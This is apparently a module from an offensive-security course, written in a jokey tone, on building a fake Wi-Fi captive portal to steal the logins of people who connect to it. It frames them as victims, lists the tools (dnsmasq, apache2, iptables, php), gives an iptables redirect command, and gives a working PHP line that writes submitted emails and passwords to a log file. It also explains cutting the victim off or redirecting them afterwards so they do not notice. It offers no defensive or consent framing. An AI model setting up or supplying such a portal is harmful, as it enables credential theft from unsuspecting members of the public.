🎯 Module 11: Captive Portals & Credential Harvesting

Ever joined a public Wi-Fi and got greeted with a "Login to access internet" page? That’s a captive portal. Now imagine if we made that page ourselves… and waited for someone to type in their secrets. 😈

🧠 What is a Captive Portal?

It’s a web page that forces users to interact with it before they get full network access. Starbucks uses it. Airports use it. Hackers weaponize it.

🍩 Real World Example

You're at a coffee shop. You connect to "FreeCoffeeWiFi". A login page pops up. You enter your email and password without thinking. But that Wi-Fi wasn’t real – it was you all along. Plot twist level: Netflix. 📺

🛠️ Tools to Build One

  • dnsmasq – To assign IPs and reroute DNS
  • apache2 – Host our login page
  • iptables – Redirect web traffic to our portal
  • php – To capture and store submitted credentials

📦 How It Works

We redirect every request to a fake login page. The victim thinks it’s real. When they submit info, we log it. Then either cut access ("oops! Wi-Fi error") or redirect to a legit page.

⚙️ Basic Setup

iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80
service apache2 start

Use a pre-made portal or design your own HTML+PHP login. Save to /var/www/html.

🧲 Harvesting Credentials

<?php
file_put_contents("log.txt", $_POST['email'] . ":" . $_POST['password'] . "\n", FILE_APPEND);
?>

That’s it. Every time someone submits their info, we log it in log.txt. It’s like phishing… but via Wi-Fi.
